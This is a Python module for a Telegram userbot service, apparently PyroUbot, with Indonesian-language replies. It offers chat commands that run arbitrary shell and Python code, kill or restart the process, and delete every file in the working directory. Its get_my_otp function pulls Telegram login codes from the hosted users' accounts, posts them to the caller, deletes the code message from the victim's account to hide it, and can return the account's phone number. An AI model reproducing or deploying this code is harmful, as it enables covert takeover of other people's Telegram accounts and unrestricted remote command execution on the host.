import os
import platform
import subprocess
import sys
import traceback
from datetime import datetime
from io import BytesIO, StringIO

import psutil

from PyroUbot import *


async def shell_cmd(client, message):
    command = get_arg(message)
    msg = await message.reply("memproses...", quote=True)
    if not command:
        return await msg.edit("noob")
    try:
        if command == "shutdown":
            await msg.delete()
            await handle_shutdown(message)
        elif command == "restart":
            await msg.delete()
            await handle_restart(message)
        elif command == "update":
            await msg.delete()
            await handle_update(message)
        elif command == "clean":
            await handle_clean(message)
            await msg.delete()
        elif command == "host":
            await handle_host(message)
            await msg.delete()
        else:
            await process_command(message, command)
            await msg.delete()
    except Exception as error:
        await msg.edit(error)


async def handle_shutdown(message):
    await message.reply("✅ System berhasil dimatikan", quote=True)
    os.system(f"kill -9 {os.getpid()}")


async def handle_restart(message):
    await message.reply("✅ System berhasil direstart", quote=True)
    os.execl(sys.executable, sys.executable, "-m", "PyroUbot")


async def handle_update(message):
    out = subprocess.check_output(["git", "pull"]).decode("UTF-8")
    if "Already up to date." in str(out):
        return await message.reply(out, quote=True)
    elif int(len(str(out))) > 4096:
        await send_large_output(message, out)
    else:
        await message.reply(f"```{out}```", quote=True)
    os.execl(sys.executable, sys.executable, "-m", "PyroUbot")


async def handle_clean(message):
    count = 0
    for file_name in os.popen("ls").read().split():
        try:
            os.remove(file_name)
            count += 1
        except:
            pass
    await bash("rm -rf downloads")
    await message.reply(f"✅ {count} sampah berhasil di bersihkan")


async def handle_host(message):
    system_info = get_system_info()
    formatted_info = format_system_info(system_info)
    await message.reply(formatted_info, quote=True)


async def process_command(message, command):
    result = (await bash(message.text.split(None, 1)[1]))[0]
    if int(len(str(result))) > 4096:
        await send_large_output(message, result)
    else:
        await message.reply(result)


async def send_large_output(message, output):
    with BytesIO(str.encode(str(output))) as out_file:
        out_file.name = "result.txt"
        await message.reply_document(document=out_file)


def get_system_info():
    uname = platform.uname()
    cpufreq = psutil.cpu_freq()
    svmem = psutil.virtual_memory()
    return {
        "system": uname.system,
        "release": uname.release,
        "version": uname.version,
        "machine": uname.machine,
        "boot_time": psutil.boot_time(),
        "cpu_physical_cores": psutil.cpu_count(logical=False),
        "cpu_total_cores": psutil.cpu_count(logical=True),
        "cpu_max_frequency": cpufreq.max,
        "cpu_min_frequency": cpufreq.min,
        "cpu_current_frequency": cpufreq.current,
        "cpu_percent_per_core": [
            percentage for percentage in psutil.cpu_percent(percpu=True)
        ],
        "cpu_total_usage": psutil.cpu_percent(),
        "network_upload": get_size(psutil.net_io_counters().bytes_sent),
        "network_download": get_size(psutil.net_io_counters().bytes_recv),
        "memory_total": get_size(svmem.total),
        "memory_available": get_size(svmem.available),
        "memory_used": get_size(svmem.used),
        "memory_percentage": svmem.percent,
    }


def format_system_info(system_info):
    formatted_info = "Informasi Sistem\n"
    formatted_info += f"Sistem   : {system_info['system']}\n"
    formatted_info += f"Rilis    : {system_info['release']}\n"
    formatted_info += f"Versi    : {system_info['version']}\n"
    formatted_info += f"Mesin    : {system_info['machine']}\n"

    boot_time = datetime.fromtimestamp(system_info["boot_time"])
    formatted_info += f"Waktu Hidup: {boot_time.day}/{boot_time.month}/{boot_time.year}  {boot_time.hour}:{boot_time.minute}:{boot_time.second}\n"

    formatted_info += "\nInformasi CPU\n"
    formatted_info += (
        "Physical cores   : " + str(system_info["cpu_physical_cores"]) + "\n"
    )
    formatted_info += "Total cores      : " + str(system_info["cpu_total_cores"]) + "\n"
    formatted_info += f"Max Frequency    : {system_info['cpu_max_frequency']:.2f}Mhz\n"
    formatted_info += f"Min Frequency    : {system_info['cpu_min_frequency']:.2f}Mhz\n"
    formatted_info += (
        f"Current Frequency: {system_info['cpu_current_frequency']:.2f}Mhz\n\n"
    )
    formatted_info += "CPU Usage Per Core\n"

    for i, percentage in enumerate(system_info["cpu_percent_per_core"]):
        formatted_info += f"Core {i}  : {percentage}%\n"
    formatted_info += "Total CPU Usage\n"
    formatted_info += f"Semua Core: {system_info['cpu_total_usage']}%\n"

    formatted_info += "\nBandwith Digunakan\n"
    formatted_info += f"Unggah  : {system_info['network_upload']}\n"
    formatted_info += f"Download: {system_info['network_download']}\n"

    formatted_info += "\nMemori Digunakan\n"
    formatted_info += f"Total     : {system_info['memory_total']}\n"
    formatted_info += f"Available : {system_info['memory_available']}\n"
    formatted_info += f"Used      : {system_info['memory_used']}\n"
    formatted_info += f"Percentage: {system_info['memory_percentage']}%\n"
    return f"<b>{Fonts.smallcap(formatted_info.lower())}</b>"


async def evalator_cmd(client, message):
    if not get_arg(message):
        return
    TM = await message.reply_text("Processing ...")
    cmd = message.text.split(" ", maxsplit=1)[1]
    reply_to_ = message.reply_to_message or message
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = "<b>OUTPUT</b>:\n"
    final_output += f"<b>{evaluation.strip()}</b>"
    if len(final_output) > 4096:
        with BytesIO(str.encode(final_output)) as out_file:
            out_file.name = "eval.text"
            await reply_to_.reply_document(
                document=out_file,
                caption=cmd[: 4096 // 4 - 1],
                disable_notification=True,
                quote=True,
            )
    else:
        await reply_to_.reply_text(final_output, quote=True)
    await TM.delete()


async def trash_cmd(client, message):
    if message.reply_to_message:
        try:
            if len(message.command) < 2:
                if len(str(message.reply_to_message)) > 4096:
                    with BytesIO(str.encode(str(message.reply_to_message))) as out_file:
                        out_file.name = "trash.txt"
                        return await message.reply_document(document=out_file)
                else:
                    return await message.reply(message.reply_to_message)
            else:
                value = eval(f"message.reply_to_message.{message.command[1]}")
                return await message.reply(value)
        except Exception as error:
            return await message.reply(str(error))
    else:
        return await message.reply("bukan gitu caranya")


async def get_my_otp(client, message):
    TM = await message.reply("<b>sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs</b>", quote=True)
    if len(message.command) < 2:
        return await TM.edit("<b>ᴘᴀʏᴀʜ ɢɪᴛᴜ ᴀᴊᴀ ɴɢɢᴀᴋ ʙɪsᴀ</b>")
    else:
        for X in ubot._ubot:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if not otp.text:
                            await message.reply(
                                "<b>❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>", quote=True
                            )
                        else:
                            await message.reply(otp.text, quote=True)
                            await X.delete_messages(X.me.id, otp.id)
                    await TM.delete()
                else:
                    return await TM.edit(X.me.phone_number)


async def cb_restart(client, callback_query):
    await callback_query.message.delete()
    os.system(f"kill -9 {os.getpid()} && python3 -m PyroUbot")


async def cb_gitpull(client, callback_query):
    await callback_query.message.delete()
    os.system(f"kill -9 {os.getpid()} && git pull && python3 -m PyroUbot")
